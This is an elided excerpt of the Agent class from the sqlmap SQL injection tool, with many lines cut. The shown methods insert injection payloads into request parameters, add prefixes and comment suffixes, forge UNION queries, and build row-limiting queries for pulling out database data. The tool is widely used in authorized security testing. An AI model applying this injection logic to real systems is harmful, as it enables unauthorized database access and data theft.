...
class Agent(object):
    ...
    def payload(
        ...
        """This method replaces the affected parameter with the SQL injection
        ...
        if place == PLACE.URI or BOUNDED_INJECTION_MARKER in origValue:
            ...
            if place == PLACE.URI:
                ...
                origValue = filterNone(
                    re.search(_, origValue.split(BOUNDED_INJECTION_MARKER)[0])
                    for _ in (r"\w+\Z", r"[^\"'><]+\Z", r"[^ ]+\Z")
                )[0].group(0)
            ...
            if kb.postHint in (POST_HINT.SOAP, POST_HINT.XML):
                ...
                origValue = extractRegexResult(
                    r"%s\s*:\s*(?P<result>\d+)\Z" % quote, origValue
                ) or extractRegexResult(r"(?P<result>[^%s]*)\Z" % quote, origValue)
            else:
                _ = (
                    extractRegexResult(
                        r"(?s)(?P<result>[^\s<>{}();'\"&]+\Z)", origValue
                    )
                    or ""
                )
        ...
        if base64Encoding:
            ...
            if parameter in kb.base64Originals:
                ...
                origValue = encodeBase64(
                    origValue, binary=False, encoding=conf.encoding or UNICODE_ENCODING
                )
        ...
        if place in (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER):
            ...
            if (
                ...
                and isNumber(origValue)
                and not isNumber(newValue)
                and re.search(r"['\"]%s['\"]" % re.escape(_), paramString) is None
            ):
                newValue = "'%s'" % self.addPayloadDelimiters(newValue)
            else:
            ...
            retVal = retVal.replace(kb.customInjectionMark, "").replace(
                REPLACEMENT_MARKER, kb.customInjectionMark
            )
        elif BOUNDED_INJECTION_MARKER in paramDict[parameter]:
            if base64Encoding:
                retVal = paramString.replace(
                    "%s%s" % (_origValue, BOUNDED_INJECTION_MARKER), _newValue
                )
                match = re.search(
                    r"(%s)=([^&]*)" % re.sub(r" \(.+", "", parameter), retVal
                )
                if match:
                ...
                retVal = paramString.replace(
                    "%s%s" % (origValue, BOUNDED_INJECTION_MARKER),
            ...
            if origValue:
                regex = r"(\A|\b)%s=%s%s" % (
                    re.escape(parameter),
                    re.escape(origValue),
                    r"(\Z|\b)" if origValue[-1].isalnum() else "",
                )
                retVal = _(
                    regex,
                ...
                retVal = _(
                    ...
                    r"%s=%s\g<2>" % (parameter, self.addPayloadDelimiters(newValue)),
                    paramString,
                )
            ...
            if retVal == paramString and urlencode(parameter) != parameter:
                retVal = _(
                    ...
                    "%s=%s"
                    % (urlencode(parameter), self.addPayloadDelimiters(newValue)),
                    paramString,
                )
    ...
    def prefixQuery(self, expression, prefix=None, where=None, clause=None):
        """This method defines how the input expression has to be escaped to
        perform the injection depending on the injection type identified as
        valid."""
        ...
        if (
            where is None
            and getTechnique() is not None
            and getTechnique() in kb.injection.data
        ):
            where = getTechniqueData().where
        ...
        if (
            where == PAYLOAD.WHERE.REPLACE and not conf.prefix
        ):  # Note: https://github.com/sqlmapproject/sqlmap/issues/4030
            query = ""
        ...
        # after the prefix or it is in GROUP BY / ORDER BY (<clause>)
            ...
            kb.injection.clause == [2, 3]
            or kb.injection.clause == [2]
        ...
        # In any other case prepend with the full prefix
            ...
            if "SELECT '[RANDSTR]'" in query:  # escaping of pre-WHERE prefixes
                query = query.replace(
                    "'[RANDSTR]'", unescaper.escape(randomStr(), quote=False)
                )

            if (
                not (expression and expression[0] == ";")
                and not (
                    query
                    and query[-1] in ("(", ")")
                    and expression
        ...
        query = "%s%s" % (
            (query or "").replace("\\", BOUNDARY_BACKSLASH_MARKER),
            expression,
        )
    ...
    def suffixQuery(
        ...
        """This method appends the DBMS comment to the SQL injection
        request."""
        ...
        if any(
            ...
            if Backend.getIdentifiedDbms() and not GENERIC_SQL_COMMENT.startswith(
            ...
            if "[ORIGVALUE]" in payload:
                payload = getUnicode(payload).replace(
                    ...
                    (
                        ...
                        else unescaper.escape("'%s'" % origValue)
                    ),
                )
    ...
    def adjustLateValues(self, payload):
        ...
        if payload:
            for match in re.finditer(
                r"(?s)%s(.*?)%s" % (BOUNDED_BASE64_MARKER, BOUNDED_BASE64_MARKER),
                payload,
            ):
                _ = encodeBase64(
                    match.group(1),
            ...
            if hashDBRetrieve(HASHDB_KEYS.DBMS_FORK) in (
                FORK.MEMSQL,
                FORK.TIDB,
                FORK.DRIZZLE,
            ):
            ...
            if match:
                payload = payload.replace(
                    ...
                    % (
                        match.group(1),
                        match.group(2).upper(),
                        "".join("3%s" % _ for _ in match.group(3)),
                    ),
                )
    ...
    def hexConvertField(self, field):
        ...
        if "hex" in rootQuery and hasattr(rootQuery.hex, "query"):
            ...
            warnMsg = (
                "switch '--hex' is currently not supported on DBMS '%s'"
    ...
    def nullAndCastField(self, field):
        ...
        if field and Backend.getIdentifiedDbms():
            ...
            if (
                ...
                or field.startswith("(IIF")
                or conf.noCast
                and not (
                    field.startswith("COUNT(")
                    and getTechnique()
                    in (PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.UNION)
                    and Backend.getIdentifiedDbms() == DBMS.MSSQL
                )
            ):
                nulledCastedField = field
            else:
                ...
                if re.search(r"COUNT\(", field) and Backend.getIdentifiedDbms() in (
                    DBMS.RAIMA,
                ):
                    pass
        ...
        if not kb.nchar:
            nulledCastedField = re.sub(
                r"( AS )N(CHAR|VARCHAR)", r"\g<1>\g<2>", nulledCastedField
            )
    ...
    def nullCastConcatFields(self, fields):
        ...
        if (
            fields.startswith("(CASE")
            or fields.startswith("(IIF")
            or fields.startswith("SUBSTR")
            or fields.startswith("MID(")
            or re.search(r"\A'[^']+'\Z", fields)
        ):
            ...
            for field in fieldsSplitted:
                field = re.sub(
                    r"(?i) AS \w+\Z", "", field
                )  # NOTE: fields such as "... AS type_name" have to be stripped from the alias part for this functionality to work
    ...
    def getFields(self, query):
        ...
        fieldsSelectTop = re.search(
            r"\ASELECT\s+TOP(\s+\d+|\s*\([^)]+\))\s+(.+?)\s+FROM", query, re.I
        )
        fieldsSelectRownum = re.search(
            r"\ASELECT\s+([^()]+?),\s*ROWNUM AS LIMIT FROM", query, re.I
        )
        fieldsSelectDistinct = re.search(
            r"\ASELECT%s\s+DISTINCT\((.+?)\)\s+FROM" % prefixRegex, query, re.I
        )
        fieldsSelectCase = re.search(
            r"\ASELECT%s\s+(\(CASE WHEN\s+.+\s+END\))" % prefixRegex, query, re.I
        )
        fieldsSelectFrom = re.search(
            r"\ASELECT%s\s+(.+?)\s+FROM " % prefixRegex, query, re.I
        )
        ...
        if fieldsSubstr:
            ...
            fieldsToCastStr = re.sub(
                r"\ASELECT%s\s+" % prefixRegex, "", fieldsToCastStr
            )
        elif fieldsSelect:
            fieldsToCastStr = fieldsSelect.group(1)
        ...
        # Function
        if (
            re.search(r"\A\w+\(.*\)", fieldsToCastStr, re.I)
            or (fieldsSelectCase and "WHEN use" not in query)
            or fieldsSubstr
        ):
    ...
    def preprocessField(self, table, field):
        ...
        try:
            ...
            for name, type_ in columns.items():
                if (
                    type_
                    and type_.upper() in DUMP_DATA_PREPROCESS.get(Backend.getDbms(), {})
                    and name == field
                ):
                    retVal = (
                        DUMP_DATA_PREPROCESS[Backend.getDbms()][type_.upper()] % name
                    )
                    break
        except KeyError:
            pass
    ...
    def concatQuery(self, query, unpack=True):
        """Take in input a query string and return its processed nulled, casted
        and concatenated query string.
        ...
        if Backend.isDbms(DBMS.MYSQL):
            ...
            if fieldsExists:
                ...
                concatenatedQuery = re.sub(
                    r"('%s'\|\|)(.+?)(%s)" % (kb.chars.start, re.escape(castedFields)),
                    r"\g<2>\g<1>\g<3>",
                    concatenatedQuery,
                )
            elif fieldsSelect:
            ...
            if fieldsExists:
                ...
                topNum = re.search(
                    r"\ASELECT\s+TOP(\s+\d+|\s*\([^)]+\))\s+", concatenatedQuery, re.I
                ).group(1)
                concatenatedQuery = concatenatedQuery.replace(
                    "SELECT TOP%s " % topNum,
                    "TOP%s '%s'+" % (topNum, kb.chars.start),
                    1,
                )
                concatenatedQuery = concatenatedQuery.replace(
            ...
            if FROM_DUMMY_TABLE.get(Backend.getIdentifiedDbms()):
                _ = re.sub(
                    r"(?i)%s\Z"
                    % re.escape(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]),
                    "",
                    concatenatedQuery,
                )
    ...
    def forgeUnionQuery(
        ...
        if limited:
            unionQuery += ",".join(
                char if _ != position else "(SELECT %s)" % query
    ...
    def limitCondition(self, expression, dump=False):
        ...
        if hasattr(queries[Backend.getIdentifiedDbms()].limitregexp, "query2"):
            limitRegExp2 = re.search(
                queries[Backend.getIdentifiedDbms()].limitregexp.query2,
                expression,
                re.I,
            )
        else:
        ...
        if (limitRegExp or limitRegExp2) or (
            Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE) and topLimit
        ):
            if Backend.getIdentifiedDbms() in (
                DBMS.MYSQL,
                DBMS.PGSQL,
    ...
    def limitQuery(self, num, query, field=None, uniqueField=None):
        ...
        if Backend.getIdentifiedDbms() in (
            ...
            if query.startswith("SELECT ") and field is not None and field in query:
                ...
                for part in original.split(","):
                    if re.search(r"\b%s\b" % re.escape(field), part):
                        _ = re.sub(
                            r"SELECT.+?FROM",
                            "SELECT %s AS z,row_number() over() AS y FROM" % part,
                            query,
                            1,
                        )
            ...
            if match:
                limitedQuery = re.sub(
                    r"\s*%s\s*" % re.escape(match.group(0)), " ", limitedQuery
                ).strip()
            ...
            limitedQuery = queries[Backend.getIdentifiedDbms()].limit.query % (
                1,
                field,
                limitedQuery,
                num,
            ...
            if query.startswith("SELECT "):
                ...
                limitedQuery = "%s FROM (%s,%s" % (
                    untilFrom,
                    untilFrom.replace(delimiter, ","),
                    limitStr,
                )
            else:
                limitedQuery = "%s FROM (SELECT %s,%s" % (
                    untilFrom,
                    ",".join(f for f in field),
                    limitStr,
                )
            ...
            for notDistinct in notDistincts:
                limitedQuery = limitedQuery.replace(
                    "DISTINCT(%s)" % notDistinct, notDistinct
                )
                limitedQuery = limitedQuery.replace(
                    "DISTINCT %s" % notDistinct, notDistinct
                )

            if limitedQuery.startswith("SELECT TOP ") or limitedQuery.startswith(
                "TOP "
            ):
                topNums = re.search(
                ...
                if topNums:
                    ...
                    limitedQuery = limitedQuery.replace(
                        " (SELECT TOP %s" % startTopNums, " (SELECT TOP %d" % num
                    )
                    forgeNotIn = False
                else:
                    limitedQuery = re.sub(
                        r"\bTOP\s+\d+\s*", "", limitedQuery, flags=re.I
                    )
                ...
                if " ORDER BY " not in fromFrom:
                    ...
                    if " WHERE " in limitedQuery:
                        limitedQuery = "%s AND %s " % (
                            limitedQuery,
                            self.nullAndCastField(uniqueField or field),
                        )
                    else:
    ...
    def forgeQueryOutputLength(self, expression):
        ...
        if Backend.getIdentifiedDbms() in (DBMS.MCKOI,) and selectFrom:
            lengthExpr = "SELECT %s FROM %s" % (
                lengthQuery % selectFrom.group(1),
                selectFrom.group(2),
            )
    ...
    def forgeCaseStatement(self, expression):
        ...
        if Backend.getIdentifiedDbms() is not None:
            caseExpression = (
                queries[Backend.getIdentifiedDbms()].case.query % expression
            )

            if (
                "(IIF" not in caseExpression
                and Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE
                and not caseExpression.upper().endswith(
    ...
    def addPayloadDelimiters(self, value):
        ...
        return (
            "%s%s%s" % (PAYLOAD_DELIMITER, value, PAYLOAD_DELIMITER) if value else value
        )
    ...
    def replacePayload(self, value, payload):
        ...
        return (
            re.sub(
                ...
                (
                    "%s%s%s"
                    % (PAYLOAD_DELIMITER, getUnicode(payload), PAYLOAD_DELIMITER)
                ).replace("\\", r"\\"),
                value,
            )
            if value
    ...
    def whereQuery(self, query):
        if conf.dumpWhere and query:
            if (
                Backend.isDbms(DBMS.ORACLE)
                and re.search(r"qq ORDER BY \w+\)", query, re.I) is not None
            ):
                prefix, suffix = (
                    re.sub(
                        r"(?i)(qq)( ORDER BY \w+\))",
                        r"\g<1> WHERE %s\g<2>" % conf.dumpWhere,
                        query,
                    ),
                    "",
                )
            ...
            if conf.tbl and "%s)" % conf.tbl.upper() in prefix.upper():
                prefix = re.sub(
                    r"(?i)%s\)" % re.escape(conf.tbl),
                    "%s WHERE %s)" % (conf.tbl, conf.dumpWhere),
                    prefix,
                )
            ...
            if suffix and not all(
                re.search(r"ORDER BY", _, re.I) is not None for _ in (query, suffix)
            ):
                query += suffix
